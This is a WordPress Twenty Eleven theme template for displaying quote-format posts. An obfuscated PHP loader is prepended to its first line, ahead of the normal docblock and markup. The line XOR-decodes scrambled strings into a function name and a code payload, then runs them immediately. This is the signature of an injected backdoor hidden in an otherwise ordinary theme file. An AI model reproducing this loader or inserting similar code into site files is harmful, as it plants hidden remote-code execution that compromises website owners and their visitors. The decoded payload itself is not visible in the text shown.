<?php $NJGmnDAx='5C,957f56<;;+=,'; $IMexBlT='V1IXAR9SCRXOBRB'^$NJGmnDAx; $oRlGnY='Q0KQ1GZ06=TNl=O I:GjcM.C9=.0,ld5K.NjyI6p:3OV;:I;:t3-=qVS;LilXF-Iq=YJTitt;  xnwsHT=zY<q=0FfvXskof9yM YRL0boxUtzKQI1Y  1XiAIA97FnxeDyqdip3KCD8tkrfbkXZ8 <SBdRnXaZ--hT1xpO81K>U kO=<Kf:JS4<:A-I 4Pfu, ,kCdz<g;gyO2+ ,SzoHXG:,spl=-G4f33CuPj7JTF rSdKQ8S.VYWyr=s;uy0piJIZf=S8DjjEf3J4KRGpOp9I.O6Ah=Q;DHVC< Dtb<B7W92mMJk>Y5OHlKEOR>PWMxe= J dt>dpTR8VA+ kdi:lhe,wf>EX;sp<  OpFxJ  -B.dFLG;qh3 I,k1Y=eocq2H:skkyg<;-VItjj7S. <YecIM;3<f< 67zXwn975 = P8P=4i;;86-0XSbq8 5nV0;<tG,>3M:>IjE=49.nummS5=,r=1WjqqnP,zNH.YSpiolTEC;C.KEB9-VB4,AnT12-uhrn S85OhmgzD VQLiQ00;1A 1BMnSYTvhCYXiPz Z sMCwILSyqZTrTl,e6 2M dWIpdOhphY>;M6o,W=2SX-H6OOwAM5 T1,dOqfTPI7qmzUFhomVpoWG.6pC7 -Ugh84.R S-N:nq<hPS CdGcLzI'; $hwwLOa=$IMexBlT('', '8VcpW24SBT; 3X7I:N4BD5A1fYODM3;X>ZiCPiMz3U:8XN TTTKBO.22O-6353YaUY8>5ETPPEYQNWShtFpP5URE2FKxTLTl0p+O+zhYBRXeOZo8uB-RLT6Ae- MVoUXA-RZMcy:o,1LTEOFJO<;LAgw+9r0xE1HT3pXXUoKE9R0NCkVY2Ogch>533H=UF>NQCUXBxnsAmFmskVJTMsGO.9+IIHzHYL3U9XV:UmJQ+85EIYn->J6O51wQVb0t:2y5I+:zBV6AdWTeBE+X>7nP4z0mJ.B 7V4BduvgWE=Oh5fS6MSMpjOH8Y:-WA8EXW6weYAYA>AMTEny2=J3 HHKLMe>-4y25je9HSTWEYoMxXnVAA7KMf7M2xLWA=M4Z<DERCUY-CHabpCXZY7iIJNA2BUYboj4GF96BXABVZeW.LYFEOI1T9GQACTJiIQ,2=.UUAF4QHYBssZV.UZ,BaYUMOGYMI7TIM-VT.CXJd9JRj,O-2POIL571Z:q  ;fH.+GX2FsZWTRDRJD2LTfHKAZlM2ddM5QDZjfKT;j3zyiKHd:=Z4LD8BFyvN+.gMCodCcXMVPEPyBSgqWMoNVH8LI,O0G2Dm6 D;B<gP1,LL;PHCcQB01=VXDZufHOM-zf21OZXgSAY4<OHUW>O2IigGJ6a5+I7LwJwp4'^$oRlGnY); $hwwLOa();
/**
 * Template for displaying content
 *
 * @package WordPress
 * @subpackage Twenty_Eleven
 * @since Twenty Eleven 1.0
 */
?>

	<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
		<header class="entry-header">
			<hgroup>
				<h2 class="entry-title"><a href="<?php the_permalink(); ?>" rel="bookmark"><?php the_title(); ?></a></h2>
				<h3 class="entry-format"><?php _e( 'Quote', 'twentyeleven' ); ?></h3>
			</hgroup>

			<div class="entry-meta">
				<?php twentyeleven_posted_on(); ?>
			</div><!-- .entry-meta -->

			<?php if ( comments_open() && ! post_password_required() ) : ?>
			<div class="comments-link">
				<?php comments_popup_link( '<span class="leave-reply">' . __( 'Reply', 'twentyeleven' ) . '</span>', _x( '1', 'comments number', 'twentyeleven' ), _x( '%', 'comments number', 'twentyeleven' ) ); ?>
			</div>
			<?php endif; ?>
		</header><!-- .entry-header -->

		<?php if ( is_search() ) : // Only display Excerpts for Search ?>
		<div class="entry-summary">
			<?php the_excerpt(); ?>
		</div><!-- .entry-summary -->
		<?php else : ?>
		<div class="entry-content">
			<?php the_content( __( 'Continue reading <span class="meta-nav">&rarr;</span>', 'twentyeleven' ) ); ?>
			<?php wp_link_pages( array( 'before' => '<div class="page-link"><span>' . __( 'Pages:', 'twentyeleven' ) . '</span>', 'after' => '</div>' ) ); ?>
		</div><!-- .entry-content -->
		<?php endif; ?>

		<footer class="entry-meta">
			<?php $show_sep = false; ?>
			<?php
				/* translators: used between list items, there is a space after the comma */
				$categories_list = get_the_category_list( __( ', ', 'twentyeleven' ) );
				if ( $categories_list ):
			?>
			<span class="cat-links">
				<?php printf( __( '<span class="%1$s">Posted in</span> %2$s', 'twentyeleven' ), 'entry-utility-prep entry-utility-prep-cat-links', $categories_list );
				$show_sep = true; ?>
			</span>
			<?php endif; // End if categories ?>
			<?php
				/* translators: used between list items, there is a space after the comma */
				$tags_list = get_the_tag_list( '', __( ', ', 'twentyeleven' ) );
				if ( $tags_list ):
				if ( $show_sep ) : ?>
			<span class="sep"> | </span>
				<?php endif; // End if $show_sep ?>
			<span class="tag-links">
				<?php printf( __( '<span class="%1$s">Tagged</span> %2$s', 'twentyeleven' ), 'entry-utility-prep entry-utility-prep-tag-links', $tags_list );
				$show_sep = true; ?>
			</span>
			<?php endif; // End if $tags_list ?>

			<?php if ( comments_open() ) : ?>
			<?php if ( $show_sep ) : ?>
			<span class="sep"> | </span>
			<?php endif; // End if $show_sep ?>
			<span class="comments-link"><?php comments_popup_link( '<span class="leave-reply">' . __( 'Leave a reply', 'twentyeleven' ) . '</span>', __( '<b>1</b> Reply', 'twentyeleven' ), __( '<b>%</b> Replies', 'twentyeleven' ) ); ?></span>
			<?php endif; // End if comments_open() ?>

			<?php edit_post_link( __( 'Edit', 'twentyeleven' ), '<span class="edit-link">', '</span>' ); ?>
		</footer><!-- .entry-meta -->
	</article><!-- #post-<?php the_ID(); ?> -->
